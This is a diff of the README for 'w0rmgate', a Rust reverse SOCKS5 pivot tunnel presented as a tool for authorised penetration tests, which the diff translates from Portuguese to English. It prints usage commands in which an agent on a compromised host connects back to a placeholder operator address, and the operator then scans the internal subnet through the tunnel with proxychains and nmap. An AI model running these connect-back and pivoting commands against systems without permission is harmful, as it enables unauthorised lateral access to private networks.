@@ -1,4 +1,4 @@
-# w0rmgate
+<img src="docs/banner.svg" alt="w0rmgate" width="100%">
 
 [![build](https://img.shields.io/github/actions/workflow/status/grimh3xx/w0rmgate/build.yml?branch=main&style=flat-square&labelColor=111826&label=build)](https://github.com/grimh3xx/w0rmgate/actions)
 [![license](https://img.shields.io/github/license/grimh3xx/w0rmgate?style=flat-square&labelColor=111826&color=22D3EE)](LICENSE)
@@ -7,61 +7,68 @@
 ![authorised use](https://img.shields.io/badge/authorised%20use-only-F87171?style=flat-square&labelColor=111826)
 
 
-**Túnel SOCKS5 reverso em Rust para pivoting em pentest autorizado.** O agente roda
-no host comprometido e **liga de volta** ao operador; o operador ganha um proxy
-SOCKS5 que sai na rede interna do agente. Resolve o caso clássico em que o alvo
-está atrás de NAT/firewall e não aceita conexões de entrada.
+**Reverse SOCKS5 pivot tunnel in Rust for authorised pentests.** The agent runs on
+the compromised host and **connects back** to the operator; the operator gets a
+SOCKS5 proxy that egresses onto the agent's internal network. Solves the classic
+case where the target sits behind NAT/firewall and accepts no inbound.
 
 <p align="center"><img src="docs/demo.svg" alt="w0rmgate demo" width="100%"></p>
 
-> ## ⚠️ Uso autorizado apenas
-> Pivoting dá acesso lateral à rede interna do alvo. Use **somente** em
-> ambientes com escopo e **permissão explícita**. A responsabilidade é sua.
+> ## ⚠️ Authorised use only
+> Pivoting grants lateral access to the target's internal network. Use **only**
+> in scoped, explicitly authorised environments. You are responsible.
 
-## Como funciona
+## How it works
 
 ```
-operador (você)                         host comprometido
+operator (you)                          compromised host
 ┌─────────────────────┐                 ┌──────────────────┐
-│ w0rmgate server     │◄───── liga ─────│ w0rmgate agent   │
-│  :7000 controle     │   de volta      │                  │
-│  :1080 SOCKS5 ──────┼─ túnel mux ────►│  dial rede interna
+│ w0rmgate server     │◄──── connects ──│ w0rmgate agent   │
+│  :7000 control      │     back        │                  │
+│  :1080 SOCKS5 ──────┼─ mux tunnel ───►│  dials internal net
 └─────────────────────┘                 └──────────────────┘
 proxychains / browser ─► 127.0.0.1:1080
 ```
 
-Multiplexa várias conexões SOCKS sobre um único canal TCP
-(frames `[id][kind][len][data]`).
+Multiplexes many SOCKS connections over one TCP channel
+(`[id][kind][len][data]` frames) with backpressure and a dial timeout.
 
-## Uso
+## Usage
 
-No operador:
+On the operator:
 
 ```sh
 w0rmgate server --control 0.0.0.0:7000 --socks 127.0.0.1:1080
 ```
 
-No host comprometido:
+On the compromised host:
 
 ```sh
-w0rmgate agent --connect SEU_IP:7000
+w0rmgate agent --connect YOUR_IP:7000
 ```
 
-Depois:
+Then:
 
 ```sh
 proxychains -q nmap -sT 10.10.20.0/24
-curl --socks5-hostname 127.0.0.1:1080 http://interno.local
+curl --socks5-hostname 127.0.0.1:1080 http://internal.local
+```
+
+## Tests
+
+```sh
+cargo test --release      # frame codec round-trips
+./tests/e2e.sh            # operator+agent+SOCKS through to a local origin (8/8)
 ```
 
 ## Build
 
 ```sh
 cargo build --release
-# agente num host Windows:
+# agent on a Windows host:
 cargo build --release --target x86_64-pc-windows-gnu
 ```
 
-## Licença
+## License
 
-MIT. Veja [LICENSE](LICENSE).
+MIT. See [LICENSE](LICENSE).
